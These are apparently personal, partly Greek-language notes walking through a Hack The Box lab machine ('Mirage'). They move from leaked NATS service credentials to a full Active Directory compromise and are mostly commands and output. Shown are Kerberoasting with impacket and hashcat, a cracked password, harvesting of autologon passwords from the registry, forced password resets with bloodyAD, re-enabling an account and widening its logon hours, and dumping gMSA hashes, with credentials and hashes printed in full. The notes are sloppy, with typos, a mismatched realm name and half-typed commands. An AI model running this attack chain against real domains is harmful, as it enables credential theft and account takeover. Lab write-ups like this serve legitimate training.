You found a NATS service
NATS is a simple, secure and high performance open source data layer for cloud native applications, IoT messaging, and microservices architectures.

simple a messaging app for microservices


simple working:
1. nats server run
running the server....

2. nats reply hello.jeremy "Hi"
and waits for requests of it...

3. in another shell: nats req hello.jeremy ""
and it gets the "Hi"

Thas all:)

So people subscribe to an topic/subject they want:
1. nats sub hello.word
and waits to here...

2.another shell just publish something there: nats pub hello.word "Hi friend"
and thats what the sub gets

you can do this with a lot of publishers or subs
this line pubs the message every 1 second: nats pub hello.word "Hi friend" --count=-1 --sleep=1s

It has some more feutures like load balancer and others...but lets focus on security:)

--------------------------------------------------------------------------------------------------------------------------------------

 NATS provides various security mechanisms, including authentication and encryption, to ensure secure communication between clients and servers.



fake script and the other and got:
"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!"

 export NATS_USER=Dev_Account_A               
export NATS_PASSWORD='hx5h7F5554fP@1337!'

nats sub ">" --server nats://10.10.11.78:4222
nats consumer next auth_logs CTF_reader --count=5 --server nats://10.10.11.78:4222
and got:
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}


generally in every windows machine you need to change the clock to be the same as DC. i have a script for it at my Desktop.

ftiakse tin ora opos thes (exo kai ena timo script sto desktop)

└─# nxc ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@'   


──(root㉿kali)-[/home/kali/challenge5]
└─# impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request

and take a krb hash

$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$9adf38ad0dea53b2645bd7cf36ec28f8$537662c4a2181758817a194b479e54d1b14fb53b06387db0f6f1be0f13ac0f30302b54d4ee0be13c9b4755768574db03fb55b268690fe9ce7bb4ef2d84235210fc712ba457be20c369b4bf60de81415754b37867e2f84a6f21f041f527e8e8b57ccae39c9a151a08a10491788ce0f4e7a75d95249b00bb5996f667a4b8d3bc6c822ea48e96ec000dad0e2b4d7c260647595f5473d6316982b887cc7f99ac2b32deb7c9732e8ce2b34b2352b9636b8a7cebbb7d83212a4e16cda844094e8553e5827830d99968a2cf660b1debec6b705810d6af1024236740479675dfcfbbf9ba33557badd6ffe9029b67e09c5013af822141395ad7859281703d8bf895af090f3df8a42ed65355916df4599023bbe81c6bd0d1b6b58f59547f041360acbdc26587e203d13b42042aa85cbe22333fb688eafa12281066e4d39325436e0f995cf3cf8f6917684c9a30d2515f5320527d5536d58e14190769c16f5966e5fe19c18a08681eb211c6595ee5e0dae18ec6c4a1a61d87a6f6313be8247018f4803d074d96cce7a66198ed50de4b8ab954d45b0e630b0b19e1e319b3ed2587c6687347cd11140e7bf1621f427c3c17235d618c26ef439707e43a05f994f5a3f9b5b0a051621d7b4ca246bdbda6f1bc977ec2a534c2f20847f8c405168fa595b5a01680be68bcb8887e2a9ec91a8b92fddb4563b1ea4c6a58fb65171ee7b0eca0758aaeb231f482e93d56fc1f0eafe7cba2f73ded9978f05e6d25e4653416ae00fa95da78b48a98faa1ab07c93ccbba19d740a08173a9139471afb8f594bd964bdebb697d51fecfcb794fec81b927203652308eaca56e81ed02855a4e6fd4f0b32d22ed4d7c903b089449ed65ad9b9e6c72977f92afda385eab9e362e31137f4e800ead1beb17f38cdbeb2f6cab8d614d31dc4205e0c718a31b1a4f7f41705ce92adc172f2b7125736b2cd60343326bec98295e74c41115add14ef357f64bfa920dad7924fac62ec630c217cae449942fed6467a5a20958332c1f9be1db56a9c30b388db8ad83aea5d2efde4e2a2d3477355c37804940ed1f5c87c0705a41089e49aaa8106a760422e44f48a5f90b88b19249ce7945d4a7f334188ae5f8f92a84cc07a11575b75edcf1d19ef4aa3d92f0e3999da7483c61b382a2e6f19cdf086cc3bb6ca38535ed837a210626597757dd2dbde679261dc2e87daad6e92034e760c962804ba1664f7c6009b8839f26a038a6463cd0c231f7644b59d992e963ccd327383d84344b123b8cc07b3225b8fc5354bee879d60dabd28df57cc49572557e4cee6a98a9dddae2bb396a7ceca256d9c1770ba208971b81f2c0314e5ac50a30dbc9c318e029fe979cd5d0c47cd0a80947480e70f02eb1a0b89999810ad613c0cd557158cb6e44574ae4033a156ef9a8d01e71dc8015e3f36b8b3fd22cf3af10c7f0a4ef7c95373dcf1ef0a7097e7e1b81f3b10a332a08ab9d5801eb811310a7d46d83d83c3da832760405cc8ade05c6fafb8aafa52dcc455565511ec383615116fbabd87b9931db57291b73989a8825cd57eada2fb19ca430b571ca0a

brake it: 
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force

nathan.aadam
and got: 3edc#EDC3


now you need to configure the krb5.conf file and get a kerberos ticket
do it manually with:

[libdefaults]
default_realm = MIRAGE.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
forwardable = yes
default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
[realms]
MIRAGE.HTB = {
kdc = 10.129.37.213
}
[domain_realm]
.rustykey.htb = MIRAGE.HTB
rustykey.htb = MIRAGE.HTB

impacket-getTGT dc-ip 10... mirage.htb/nathan.aadam:'password' 
export KRB5CCNAME=nathan.aadam.ccache
klist


or:

nxc smb ip -u u -p p —generate-krb5-file krb5.conf

move it maybe to /etc, cause there is the right /etc/krb5.conf




evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb

get user.txt

bloodhound it: bloodhound-python -u nathan.aadam -p '3edc#EDC3' -c All -d mirage.htb -ns 10.129.146.203 --zip


Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon

Αναζητά αν υπάρχει auto-login ρυθμισμένο στο σύστημα, μαζί με τα πεδία:

DefaultUserName

DefaultDomainName

DefaultPassword

AutoAdminLogon

Αν αυτά υπάρχουν και το AutoAdminLogon = 1, τότε μπορείς να πάρεις plaintext password από το DefaultPassword (αν υπάρχει).

DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
--------------- ----------------- --------------- --------------
mark.bbond      MIRAGE            1day@atime      1


set his as owned in bloodhound

 bloodyAD --kerberos -u "mark.bbond" -p "1day@atime" -d "mirage.htb" --host "dc01.mirage.htb" set password "javier.mmarshall" 'Newp@ssw0rd'


at evil-winrm:
 Δημιουργείται ένα PowerShell credential object με τον χρήστη mark.bbond.

➡️ Ο χρήστης mark.bbond χρησιμοποιείται για να ενεργοποιήσει (Enable-ADAccount) τον χρήστη javier.mmarshall.

🟢 Άρα: ο javier.mmarshall ήταν disabled, και τώρα ενεργοποιείται από εξουσιοδοτημένο χρήστη.


2)
➡️ Εξάγονται οι LogonHours από τον mark.bbond, οι οποίες ορίζουν πότε επιτρέπεται login.

➡️ Ορίζονται οι ίδιες LogonHours στον javier.mmarshall.

📌 Αν ο javier.mmarshall είχε περιορισμό (π.χ. logon μόνο τη νύχτα), τώρα ξεκλειδώνεται για 24/7 login όπως ο mark.bbond.


Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
Enable-ADAccount -Identity javier.mmarshall -Cred $Cred
 
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> $logonhours = Get-ADUser mark.bbond -Properties LogonHours | select-object -expand logonhours
[byte[]]$hours1 = $logonhours
Set-ADUser -Identity javier.mmarshall -Cred $Cred -Replace @{logonhours = $hours1}




#  bloodyAD --kerberos -u "mark.bbond" -p "1day@atime" -d "mirage.htb" --host "dc01.mirage.htb" set password "javier.mmarshall" 'Newp@ssw0rd'
[+] Password changed successfully!

# impacket-getTGT MIRAGE.HTB/javier.mmarshall:'Newp@ssw0rd' -dc-ip 10.10.11.78
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in javier.mmarshall.ccache
exprot it 
klist



git clone https://github.com/micahvandeusen/gMSADumper
cd 
python3 gMSADumper.py -k -d mirage.htb -l dc01.mirage.htb
Users or groups who can read password for Mirage-Service$:
 > javier.mmarshall
Mirage-Service$:::305806d84f7c1be93a07aaf40f0c7866
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd

